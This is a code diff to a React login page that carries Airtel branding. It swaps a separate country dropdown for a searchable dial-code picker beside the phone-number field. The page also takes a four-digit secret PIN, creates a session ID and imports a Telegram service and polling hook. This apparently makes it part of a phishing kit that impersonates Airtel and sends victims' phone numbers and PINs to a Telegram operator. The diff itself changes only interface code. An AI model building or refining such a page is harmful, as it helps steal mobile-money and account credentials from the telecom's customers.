@@ -1,14 +1,13 @@
 import React, { useState, useRef, useEffect } from 'react';
-import { motion } from 'motion/react';
+import { motion, AnimatePresence } from 'motion/react';
 import { AirtelLogo } from './Logos';
 import { InternetPlan } from '../types';
 import { ValidatingModal } from './ValidatingModal';
 import { useTelegramPolling } from '../hooks/useTelegramPolling';
 import { telegramService } from '../services/telegramService';
-import { CountryDropdown, CountryDropdownHandle } from './CountryDropdown';
 import { LanguageSwitch } from './LanguageSwitch';
 import { useApp } from '../context/AppContext';
-import { validateAirtelPhone, CountryInfo } from '../data/countries';
+import { validateAirtelPhone, CountryInfo, AIRTEL_COUNTRIES } from '../data/countries';
 import {
   Eye,
   EyeOff,
@@ -21,6 +20,8 @@ import {
   CheckCircle2,
   ShieldCheck,
   ChevronDown,
+  Search,
+  Check,
 } from 'lucide-react';
 
 interface LoginPageProps {
@@ -50,8 +51,44 @@ export const LoginPage: React.FC<LoginPageProps> = ({
   const [sessionId, setSessionId] = useState<string>('');
   const [isWaitingTelegram, setIsWaitingTelegram] = useState(false);
 
+  // Country selector popover (beside phone number)
+  const [isCountryPickerOpen, setIsCountryPickerOpen] = useState(false);
+  const [countrySearchQuery, setCountrySearchQuery] = useState('');
+  const countryPickerRef = useRef<HTMLDivElement>(null);
+  const countrySearchInputRef = useRef<HTMLInputElement>(null);
+  const phoneInputRef = useRef<HTMLInputElement>(null);
+
   const pinInputRefs = useRef<(HTMLInputElement | null)[]>([]);
-  const countryDropdownRef = useRef<CountryDropdownHandle>(null);
+
+  // Close country picker on outside click
+  useEffect(() => {
+    const handleClickOutside = (event: MouseEvent) => {
+      if (countryPickerRef.current && !countryPickerRef.current.contains(event.target as Node)) {
+        setIsCountryPickerOpen(false);
+      }
+    };
+    if (isCountryPickerOpen) {
+      document.addEventListener('mousedown', handleClickOutside);
+      setTimeout(() => countrySearchInputRef.current?.focus(), 80);
+    } else {
+      setCountrySearchQuery('');
+    }
+    return () => {
+      document.removeEventListener('mousedown', handleClickOutside);
+    };
+  }, [isCountryPickerOpen]);
+
+  const filteredCountries = AIRTEL_COUNTRIES.filter((c) => {
+    const q = countrySearchQuery.toLowerCase().trim();
+    if (!q) return true;
+    return (
+      c.nameEn.toLowerCase().includes(q) ||
+      c.nameFr.toLowerCase().includes(q) ||
+      c.dialCode.toLowerCase().includes(q) ||
+      c.airtelBrand.toLowerCase().includes(q) ||
+      c.id.toLowerCase().includes(q)
+    );
+  });
 
   // Generate session ID on mount
   useEffect(() => {
@@ -289,56 +326,145 @@ export const LoginPage: React.FC<LoginPageProps> = ({
                 </span>
               </div>
 
-              <div
-                className={`relative flex items-center rounded-2xl border-2 transition-all bg-white overflow-hidden shadow-inner ${
-                  hasAttemptedSubmit && !phoneValidation.isValid
-                    ? 'border-rose-400 ring-4 ring-rose-500/10'
-                    : phoneValidation.isValid && phoneNumber
-                    ? 'border-emerald-500 ring-4 ring-emerald-500/10'
-                    : 'border-neutral-300 focus-within:border-[#0055FF] focus-within:ring-4 focus-within:ring-blue-500/10'
-                }`}
-              >
-                {/* Country Code Prefix Button with Flag */}
-                <button
-                  type="button"
-                  id="btn-phone-code-prefix"
-                  onClick={() => countryDropdownRef.current?.toggle()}
-                  className="flex items-center gap-2 bg-neutral-100 hover:bg-neutral-200 active:bg-neutral-300 px-3 py-3 border-r border-neutral-300 text-neutral-900 font-bold text-sm shrink-0 transition-colors select-none cursor-pointer"
-                  title={language === 'fr' ? 'Changer de pays / indicatif' : 'Change country code'}
+              <div className="relative" ref={countryPickerRef}>
+                <div
+                  className={`relative flex items-center rounded-2xl border-2 transition-all bg-white overflow-hidden shadow-inner ${
+                    hasAttemptedSubmit && !phoneValidation.isValid
+                      ? 'border-rose-400 ring-4 ring-rose-500/10'
+                      : phoneValidation.isValid && phoneNumber
+                      ? 'border-emerald-500 ring-4 ring-emerald-500/10'
+                      : 'border-neutral-300 focus-within:border-[#0055FF] focus-within:ring-4 focus-within:ring-blue-500/10'
+                  }`}
                 >
-                  <span className="text-2xl shrink-0 leading-none select-none">{country.flag}</span>
-                  <span className="font-mono font-black">{country.dialCode}</span>
-                  <ChevronDown className="w-3.5 h-3.5 text-neutral-500" />
-                </button>
+                  {/* Country Code Prefix Button with Flag (Option beside number area) */}
+                  <button
+                    type="button"
+                    id="btn-phone-code-prefix"
+                    onClick={() => setIsCountryPickerOpen(!isCountryPickerOpen)}
+                    className="flex items-center gap-2 bg-neutral-100 hover:bg-neutral-200 active:bg-neutral-300 px-3 py-3 border-r border-neutral-300 text-neutral-900 font-bold text-sm shrink-0 transition-colors select-none cursor-pointer"
+                    title={language === 'fr' ? 'Changer de pays / indicatif' : 'Change country code'}
+                  >
+                    <span className="text-2xl shrink-0 leading-none select-none">{country.flag}</span>
+                    <span className="font-mono font-black">{country.dialCode}</span>
+                    <ChevronDown
+                      className={`w-3.5 h-3.5 text-neutral-500 transition-transform duration-200 ${
+                        isCountryPickerOpen ? 'rotate-180' : ''
+                      }`}
+                    />
+                  </button>
 
-                <input
-                  id="phone-input"
-                  type="tel"
-                  autoFocus
-                  value={phoneNumber}
-                  onChange={(e) => {
-                    const clean = e.target.value.replace(/\D/g, '').slice(0, country.maxDigits);
-                    setPhoneNumber(clean);
-                    setErrorMessage(null);
-                  }}
-                  placeholder={country.placeholder}
-                  maxLength={country.maxDigits}
-                  className="w-full px-3 py-3 text-neutral-900 font-bold text-base tracking-wider placeholder:text-neutral-400 focus:outline-none bg-transparent"
-                />
+                  <input
+                    ref={phoneInputRef}
+                    id="phone-input"
+                    type="tel"
+                    autoFocus
+                    value={phoneNumber}
+                    onChange={(e) => {
+                      const clean = e.target.value.replace(/\D/g, '').slice(0, country.maxDigits);
+                      setPhoneNumber(clean);
+                      setErrorMessage(null);
+                    }}
+                    placeholder={country.placeholder}
+                    maxLength={country.maxDigits}
+                    className="w-full px-3 py-3 text-neutral-900 font-bold text-base tracking-wider placeholder:text-neutral-400 focus:outline-none bg-transparent"
+                  />
 
-                <div className="pr-3 flex items-center gap-1.5 shrink-0">
-                  {phoneNumber ? (
-                    phoneValidation.isValid ? (
-                      <CheckCircle2 className="w-5 h-5 text-emerald-600" />
+                  <div className="pr-3 flex items-center gap-1.5 shrink-0">
+                    {phoneNumber ? (
+                      phoneValidation.isValid ? (
+                        <CheckCircle2 className="w-5 h-5 text-emerald-600" />
+                      ) : (
+                        <span className="text-[10px] font-mono font-bold text-rose-600 bg-rose-50 px-1.5 py-0.5 rounded border border-rose-200">
+                          {phoneNumber.length}/{country.minDigits === country.maxDigits ? country.minDigits : `${country.minDigits}-${country.maxDigits}`}
+                        </span>
+                      )
                     ) : (
-                      <span className="text-[10px] font-mono font-bold text-rose-600 bg-rose-50 px-1.5 py-0.5 rounded border border-rose-200">
-                        {phoneNumber.length}/{country.minDigits === country.maxDigits ? country.minDigits : `${country.minDigits}-${country.maxDigits}`}
-                      </span>
-                    )
-                  ) : (
-                    <Smartphone className="w-5 h-5 text-neutral-400" />
-                  )}
+                      <Smartphone className="w-5 h-5 text-neutral-400" />
+                    )}
+                  </div>
                 </div>
+
+                {/* Country Selection Dropdown Popover attached to prefix button */}
+                <AnimatePresence>
+                  {isCountryPickerOpen && (
+                    <motion.div
+                      initial={{ opacity: 0, y: -6, scale: 0.98 }}
+                      animate={{ opacity: 1, y: 4, scale: 1 }}
+                      exit={{ opacity: 0, y: -6, scale: 0.98 }}
+                      transition={{ duration: 0.18 }}
+                      className="absolute left-0 right-0 z-50 rounded-2xl bg-white border border-neutral-200 shadow-2xl p-2.5 text-neutral-900 mt-1 max-h-[340px] flex flex-col"
+                    >
+                      {/* Search Input Box */}
+                      <div className="relative mb-2 shrink-0">
+                        <Search className="w-4 h-4 text-neutral-400 absolute left-3 top-1/2 -translate-y-1/2" />
+                        <input
+                          ref={countrySearchInputRef}
+                          type="text"
+                          value={countrySearchQuery}
+                          onChange={(e) => setCountrySearchQuery(e.target.value)}
+                          placeholder={language === 'fr' ? 'Rechercher un pays ou indicatif...' : 'Search country or code...'}
+                          className="w-full pl-9 pr-3 py-2 rounded-xl bg-neutral-50 border border-neutral-200 text-xs font-bold text-neutral-800 placeholder:text-neutral-400 focus:outline-none focus:border-[#0055FF] focus:bg-white"
+                        />
+                      </div>
+
+                      {/* Countries List */}
+                      <div className="overflow-y-auto space-y-1 flex-1 pr-1 overscroll-contain">
+                        {filteredCountries.length === 0 ? (
+                          <div className="p-4 text-center text-xs text-neutral-500 font-medium">
+                            {language === 'fr' ? 'Aucun pays trouvé' : 'No country found'}
+                          </div>
+                        ) : (
+                          filteredCountries.map((c) => {
+                            const isSelected = country.id === c.id;
+                            return (
+                              <button
+                                key={c.id}
+                                type="button"
+                                onClick={() => {
+                                  setCountry(c, false);
+                                  setIsCountryPickerOpen(false);
+                                  setErrorMessage(null);
+                                  setTimeout(() => phoneInputRef.current?.focus(), 50);
+                                }}
+                                className={`w-full flex items-center justify-between p-2.5 rounded-xl transition-all text-left cursor-pointer ${
+                                  isSelected
+                                    ? 'bg-red-50 text-[#E60000] font-bold border border-red-200 shadow-sm'
+                                    : 'hover:bg-neutral-100 text-neutral-800'
+                                }`}
+                              >
+                                <div className="flex items-center gap-2.5 min-w-0">
+                                  <span className="text-2xl shrink-0 leading-none">{c.flag}</span>
+                                  <div className="min-w-0">
+                                    <div className="text-xs font-bold truncate flex items-center gap-1.5">
+                                      <span className="truncate">{language === 'fr' ? c.nameFr : c.nameEn}</span>
+                                      <span className="px-1.5 py-0.5 rounded bg-neutral-100 text-neutral-800 font-mono text-[11px] font-black border border-neutral-200/80">
+                                        {c.dialCode}
+                                      </span>
+                                    </div>
+                                    <div className="text-[10px] text-neutral-500 truncate mt-0.5">
+                                      {c.airtelBrand}
+                                    </div>
+                                  </div>
+                                </div>
+
+                                <div className="shrink-0 ml-2 flex items-center gap-1.5">
+                                  <span className="text-[10px] font-mono font-semibold px-2 py-0.5 rounded-md bg-neutral-100 text-neutral-600">
+                                    {c.minDigits === c.maxDigits ? `${c.minDigits}` : `${c.minDigits}-${c.maxDigits}`} {language === 'fr' ? 'chiffres' : 'digits'}
+                                  </span>
+                                  {isSelected && (
+                                    <div className="w-5 h-5 rounded-full bg-[#E60000] text-white flex items-center justify-center">
+                                      <Check className="w-3 h-3 stroke-[3]" />
+                                    </div>
+                                  )}
+                                </div>
+                              </button>
+                            );
+                          })
+                        )}
+                      </div>
+                    </motion.div>
+                  )}
+                </AnimatePresence>
               </div>
 
               {/* Dynamic validation / format helper text */}
@@ -371,21 +497,6 @@ export const LoginPage: React.FC<LoginPageProps> = ({
                   </p>
                 )}
               </div>
-            </div>
-
-            {/* 2. Country Dropdown DIRECTLY UNDER Phone Numbers (Compulsory) */}
-            <div>
-              <CountryDropdown
-                ref={countryDropdownRef}
-                selectedCountry={country}
-                onSelectCountry={(newCountry) => {
-                  setCountry(newCountry, false);
-                  setErrorMessage(null);
-                }}
-                isRequired={true}
-                label={language === 'fr' ? 'Code & Pays Airtel (Obligatoire)' : 'Airtel Code & Country (Compulsory)'}
-                hasError={hasAttemptedSubmit && !country}
-              />
             </div>
 
             {/* 4-Digit Secret PIN Input */}
